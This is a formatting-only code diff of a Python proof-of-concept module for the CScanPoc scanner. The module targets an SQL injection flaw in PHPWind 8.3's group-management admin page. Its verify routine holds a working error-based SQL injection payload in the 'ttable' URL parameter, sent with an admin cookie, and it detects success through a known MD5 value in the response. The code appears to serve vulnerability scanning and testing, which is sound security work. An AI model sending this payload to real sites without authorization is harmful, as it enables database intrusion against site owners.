@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPWind_0011_p' # 平台漏洞编号，留空
+    vuln_id = 'PHPWind_0011_p'  # 平台漏洞编号，留空
     name = 'PHPWind 8.3 /apps/group/admin/manage.php SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2011-03-10'  # 漏洞公布时间
     desc = '''
         利用前提是得到群组管理员权限，所以需要传入-c参数cookie
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPWind'  # 漏洞应用名称
     product_version = '8.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e725dfab-5425-4cd9-8bb5-4b1383f18fa3'
@@ -29,21 +31,21 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
+            # 属于验证后台漏洞，所以需要登录并且获取cookie，详情参考对应的PDF
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #this poc need to login, so special cookie for target must be included in http headers.
+
+            # this poc need to login, so special cookie for target must be included in http headers.
             cookie = ''
             header = {
                 'cookie': 'cookie'
             }
-            payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1"+
-                       "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid="+
-                       "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat"+
+            payload = ("/admin.php?adminjob=apps&admintype=groups_manage&action=argument&keyword=1" +
+                       "&ttable=/**/tm ON t.tid=tm.tid LEFT JOIN pw_argument a ON t.tid=" +
+                       "a.tid LEFT JOIN pw_colonys c ON a.cyid=c.id WHERE (SELECT 1 FROM (select count(*),concat" +
                        "(floor(rand(0)*2),CONCAT(0x3a,(SELECT md5(233))))a from information_schema.tables group by a)b)%23")
             verify_url = self.target + payload
-            req = requests.get(verify_url,headers=header)
+            req = requests.get(verify_url, headers=header)
 
             if 'e165421110ba03099a1c0393373c5b43' in req.text:
                 #args['success'] = True
@@ -56,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
